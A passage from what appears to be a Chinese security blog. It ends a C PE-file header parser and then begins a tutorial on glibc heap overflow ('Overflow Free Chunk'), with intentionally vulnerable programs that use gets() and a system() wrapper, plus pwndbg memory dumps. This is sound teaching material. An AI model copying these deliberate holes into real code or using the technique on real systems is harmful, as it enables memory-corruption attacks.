class="line"></span><br><span class="line">	<span class="built_in">memset</span>(szFilePath, <span class="number">0</span>, MAX_PATH);</span><br><span class="line">	<span class="built_in">memset</span>(&amp;ofn, <span class="number">0</span>, <span class="keyword">sizeof</span>(ofn));</span><br><span class="line"></span><br><span class="line">	ofn.lStructSize = <span class="keyword">sizeof</span>(ofn);</span><br><span class="line">	ofn.hwndOwner = <span class="literal">NULL</span>;</span><br><span class="line">	ofn.hInstance = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">	ofn.nMaxFile = MAX_PATH;</span><br><span class="line">	ofn.lpstrInitialDir = <span class="string">"."</span>;</span><br><span class="line">	ofn.lpstrFile = szFilePath;</span><br><span class="line">	ofn.lpstrTitle = <span class="string">"choose a PE file --by Thunder_J"</span>;</span><br><span class="line">	ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;</span><br><span class="line">	ofn.lpstrFilter = <span class="string">"*.*\0*.*\0"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GetOpenFileName(&amp;ofn))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"打开文件错误:%d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hFile = CreateFile(szFilePath, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hFile)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">"打开文件错误"</span>, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	hMapping = CreateFileMapping(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hMapping)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"创建映射错误:%d"</span>, GetLastError());</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ImageBase = MapViewOfFile(hMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ImageBase)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"文件映射错误:%d"</span>, GetLastError());</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  PE头的判断                                 */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="keyword">if</span> (!ImageBase) <span class="comment">//判断映像地址</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Not a valid PE file 1!\n"</span>);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------PEheader------------------------\n"</span>);</span><br><span class="line">	pDH = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">	<span class="keyword">if</span> (pDH-&gt;e_magic!=IMAGE_DOS_SIGNATURE) <span class="comment">//判断是否为MZ</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Not a valid PE file 2!\n"</span>);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	pNtH = (PIMAGE_NT_HEADERS)((DWORD)pDH + pDH-&gt;e_lfanew); <span class="comment">//判断是否为PE格式</span></span><br><span class="line">	<span class="keyword">if</span> (pNtH-&gt;Signature!=IMAGE_NT_SIGNATURE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Not a valid PE file 3!\n"</span>);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"PE e_lfanew is: 0x%x\n"</span>, pNtH);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  FileHeader                                */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	pFH = &amp;pNtH-&gt;FileHeader;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------FileHeader------------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfSections: %d\n"</span>, pFH-&gt;NumberOfSections);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfOptionalHeader: %d\n"</span>, pFH-&gt;SizeOfOptionalHeader);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  OptionalHeader                            */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	pOH = &amp;pNtH-&gt;OptionalHeader;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"-----------------OptionalHeader---------------------\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfCode:0x%08x\n"</span>, pOH-&gt;SizeOfCode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"AddressOfEntryPoint: 0x%08X\n"</span>, pOH-&gt;AddressOfEntryPoint);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"ImageBase is 0x%x\n"</span>, ImageBase);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SectionAlignment: 0x%08x\n"</span>, pOH-&gt;SectionAlignment);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"FileAlignment: 0x%08x\n"</span>, pOH-&gt;FileAlignment);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfImage: 0x%08x\n"</span>, pOH-&gt;SizeOfImage);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"SizeOfHeaders: 0x%08x\n"</span>, pOH-&gt;SizeOfHeaders);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfRvaAndSizes: 0x%08x\n"</span>, pOH-&gt;NumberOfRvaAndSizes);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  SectionTable                              */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="keyword">int</span> SectionNumber = <span class="number">0</span>;</span><br><span class="line">	DWORD SectionHeaderOffset = (DWORD)pNtH + <span class="number">24</span> + (DWORD)pFH-&gt;SizeOfOptionalHeader; <span class="comment">//节表位置的计算</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------SectionTable---------------------\n"</span>);</span><br><span class="line">	<span class="keyword">for</span> (SectionNumber; SectionNumber &lt; pFH-&gt;NumberOfSections;SectionNumber++)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSh = (PIMAGE_SECTION_HEADER)(SectionHeaderOffset + <span class="number">40</span> * SectionNumber);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d 's Name is %s\n"</span>, SectionNumber + <span class="number">1</span>, pSh-&gt;Name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"VirtualAddress: 0x%08X\n"</span>, (DWORD)pSh-&gt;VirtualAddress);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"SizeOfRawData: 0x%08X\n"</span>, (DWORD)pSh-&gt;SizeOfRawData);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"PointerToRawData: 0x%08X\n"</span>, (DWORD)pSh-&gt;PointerToRawData);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  ExportTable                               */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------ExportTable----------------------\n"</span>);</span><br><span class="line">	DWORD Export_table_offset = RVAOffset(pNtH, (DWORD)pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)ImageBase + Export_table_offset);</span><br><span class="line">	DWORD EXport_table_offset_Name = (DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;Name);</span><br><span class="line">	DWORD * pNameOfAddress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames));</span><br><span class="line">	DWORD * pFunctionOfAdress = (DWORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions));</span><br><span class="line">	WORD * pNameOrdinalOfAddress = (WORD *)((DWORD)ImageBase + RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Name:%s\n"</span>, EXport_table_offset_Name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NameOfAddress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNames));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"FunctionOfAdress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfFunctions));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NameOrdinalOfAddress:%08X\n"</span>, RVAOffset(pNtH, pExportDirectory-&gt;AddressOfNameOrdinals));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pExportDirectory-&gt;NumberOfFunctions == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"!!!!!!!!!!!!!!!!!NO EXPORT!!!!!!!!!!!!!!!!!!!!!"</span>);</span><br><span class="line">		<span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hFile);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hMapping != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hMapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (ImageBase != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			UnmapViewOfFile(ImageBase);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfNames:%d\n"</span>, pExportDirectory-&gt;NumberOfNames);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"NumberOfFunctions:%d\n"</span>, pExportDirectory-&gt;NumberOfFunctions);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="comment">/*							  ImportTable                               */</span></span><br><span class="line">	<span class="comment">/************************************************************************/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"--------------------ImportTable----------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> cont = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		DWORD dwImportOffset = RVAOffset(pNtH, pNtH-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">		dwImportOffset = dwImportOffset + cont;</span><br><span class="line">		PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)ImageBase + dwImportOffset);</span><br><span class="line">		<span class="keyword">if</span> (pImport-&gt;OriginalFirstThunk == <span class="number">0</span> &amp;&amp; pImport-&gt;TimeDateStamp == <span class="number">0</span> &amp;&amp; pImport-&gt;ForwarderChain == <span class="number">0</span> &amp;&amp; pImport-&gt;Name == <span class="number">0</span> &amp;&amp; pImport-&gt;FirstThunk == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		DWORD dwOriginalFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;OriginalFirstThunk);</span><br><span class="line">		DWORD dwFirstThunk = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;FirstThunk);</span><br><span class="line">		DWORD dwName = (DWORD)ImageBase + RVAOffset(pNtH, pImport-&gt;Name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"---------Import File Name: %s\n"</span>, dwName);</span><br><span class="line">		<span class="keyword">if</span> (dwOriginalFirstThunk == <span class="number">0x00000000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			dwOriginalFirstThunk = dwFirstThunk;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD* pdwTrunkData = (DWORD*)dwOriginalFirstThunk;</span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">0</span>, x = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (pdwTrunkData[n] != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			DWORD TrunkData = pdwTrunkData[n];</span><br><span class="line">			<span class="keyword">if</span> (TrunkData &lt; IMAGE_ORDINAL_FLAG32)<span class="comment">//名字导入</span></span><br><span class="line">			&#123;</span><br><span class="line">				PIMAGE_IMPORT_BY_NAME pInportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)ImageBase + RVAOffset(pNtH, TrunkData));</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"ImportByName: %s\n"</span>, pInportByName-&gt;Name);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				DWORD FunNumber = (DWORD)(TrunkData - IMAGE_ORDINAL_FLAG32);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"ImportByNumber: %-4d \n"</span>, FunNumber);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (x != <span class="number">0</span> &amp;&amp; x % <span class="number">3</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">			n++;</span><br><span class="line">			x++;</span><br><span class="line">		&#125;</span><br><span class="line">		cont = cont + <span class="number">40</span>;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (ImageBase)</span><br><span class="line">		&#123;</span><br><span class="line">			UnmapViewOfFile(ImageBase);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hMapping)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hMapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (hFile != INVALID_HANDLE_VALUE)</span><br><span class="line">		&#123;</span><br><span class="line">			CloseHandle(hFile);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h2><p>节表以及之前信息</p>
<p><img src="/2019/03/27/PE结构详解/12.jpg" alt="12"></p>
<p>导出表</p>
<p><img src="/2019/03/27/PE结构详解/13.jpg" alt="13"></p>
<p>导入表</p>
<p><img src="/2019/03/27/PE结构详解/14.jpg" alt="14"></p>
<h1 id="0x03：总结"><a href="#0x03：总结" class="headerlink" title="0x03：总结"></a>0x03：总结</h1><p>这个PE解析器虽然简单，但是自己写了之后对PE的理解和之前截然不同，后续可以对这个解析器进行各种优化，判断是否有壳之类的功能可以添加上去。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/koalazb/article/details/53590404" target="_blank" rel="noopener">https://blog.csdn.net/koalazb/article/details/53590404</a></p>
]]></content>
      <categories>
        <category>开发</category>
        <category>Windows工具</category>
      </categories>
      <tags>
        <tag>PE文件</tag>
      </tags>
  </entry>
  <entry>
    <title>Overflow Free Chunk</title>
    <url>/2019/03/23/Overflow-Free-Chunk/</url>
    <content><![CDATA[<h1 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h1><p>这次介绍一种和栈溢出类似名字的堆溢出攻击，首先借用应用<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heapoverflow_basic/#_1" target="_blank" rel="noopener">CTF-Wiki</a>上的例子理解一下堆溢出。</p>
<h1 id="0x01：漏洞介绍"><a href="#0x01：漏洞介绍" class="headerlink" title="0x01：漏洞介绍"></a>0x01：漏洞介绍</h1><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块，我们用两个例子来说明这个问题。</p>
<h1 id="0x02：例子"><a href="#0x02：例子" class="headerlink" title="0x02：例子"></a>0x02：例子</h1><h2 id="Example-One"><a href="#Example-One" class="headerlink" title="Example One"></a>Example One</h2><p>创建overflow.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Get input:"</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -no-pie overflow.c -o overflow -g -w</span><br></pre></td></tr></table></figure>
<p>我们把断点下好观察chunk变化</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Thunder_J-virtual-machine:~/桌面# gdb overflow </span><br><span class="line">...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 8</span></span><br><span class="line">Breakpoint 1 at 0x400599: file overflow.c, line 8.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 9</span></span><br><span class="line">Breakpoint 2 at 0x4005aa: file overflow.c, line 9.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/Thunder_J/桌面/overflow </span><br><span class="line">Get input:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at overflow.c:8</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602250-16</span></span><br><span class="line">0x602240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602250:	0x0000000000000000	0x0000000000000021 # 申请的chunk</span><br><span class="line">0x602260:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602270:	0x0000000000000000	0x0000000000000411 # next chunk</span><br><span class="line">0x602280:	0x75706e6920746547	0x00000000000a3a74</span><br><span class="line">0x602290:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # 输入64个'a'覆盖下一个chunk</span><br><span class="line"></span><br><span class="line">Breakpoint 2, main () at overflow.c:9</span><br><span class="line">9	  return 0;</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602250-16</span></span><br><span class="line">0x602240:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602250:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602260:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x602270:	0x6161616161616161	0x6161616161616161 # next chunk已经被覆盖</span><br><span class="line">0x602280:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x602290:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x6022a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6022d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>上面就是简单的堆溢出演示，在利用的时候当然不是这么的随便下面就看第二个例子。</p>
<h2 id="Example-Two"><a href="#Example-Two" class="headerlink" title="Example Two"></a>Example Two</h2><p>创建Overflow_Free_Chunk.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sh</span><span class="params">(<span class="keyword">char</span> *cmd)</span></span>&#123;</span><br><span class="line">	system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> cmd,idx,sz;</span><br><span class="line">	<span class="keyword">char</span>* ptr[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="keyword">sizeof</span>(ptr));</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"1. malloc + gets\n2. free\n3. puts"</span>);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;cmd,&amp;idx);</span><br><span class="line">		idx %= <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">if</span>(cmd==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d%*c"</span>,&amp;sz);</span><br><span class="line">			ptr[idx] = <span class="built_in">malloc</span>(sz);</span><br><span class="line">			gets(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">			ptr[idx] = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (cmd==<span class="number">3</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(ptr[idx]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -no-pie Overflow_Free_Chunk.c -o Overflow_Free_Chunk -g -w</span><br></pre></td></tr></table></figure>
<p>我们在scanf输入处下断点观察</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b 20</span></span><br><span class="line">Breakpoint 1 at 0x40085b: file Overflow_Free_Chunk.c, line 20.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/Thunder_J/桌面/Overflow_Free_Chunk </span><br><span class="line">1. malloc + gets</span><br><span class="line">2. free</span><br><span class="line">3. puts</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line">Breakpoint 1, main () at Overflow_Free_Chunk.c:20</span><br><span class="line">20			scanf("%d %d",&amp;cmd,&amp;idx);</span><br></pre></td></tr></table></figure>
<p>我们申请两次大小为24的chunk，为什么要申请24呢，因为最小的chunk大小为32位，，最小的堆即为prev_size(可以被上一个chunk占用)，size，fd(可以被本chunk占用)，bk(可以被本chunk占用) ，8*4即为32位，我们看一下堆的结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>我们知道，我们申请出来的chunk最少是32位，然而chunk的大小至少是16的倍数，我们申请小于24位的chunk，其实申请出来大小是32位，也就是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">prev_size + size + fd + bk</span><br></pre></td></tr></table></figure>
<p>我们申请两次chunk之后的情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 0</span><br><span class="line">24 aaaaaaaa</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">1 1</span><br><span class="line">24 bbbbbbbb</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602660-16</span></span><br><span class="line">0x602650:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000021 # prev_size + size</span><br><span class="line">0x602670:	0x6161616161616161	0x0000000000000000 # fd + bk</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602690:	0x6262626262626262	0x0000000000000000 # 同上</span><br><span class="line">0x6026a0:	0x0000000000000000	0x0000000000020961</span><br><span class="line">0x6026b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>我们释放两次chunk之后的情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 1</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> c</span></span><br><span class="line">Continuing.</span><br><span class="line">2 0</span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/20gx 0x602660-16</span></span><br><span class="line">0x602650:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602660:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602670:	0x0000000000602690	0x0000000000000000</span><br><span class="line">0x602680:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x602690:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6026a0:	0x0000000000000000	0x0000000000020961</span><br><span class="line">0x6026b0:	0x0000000000000000	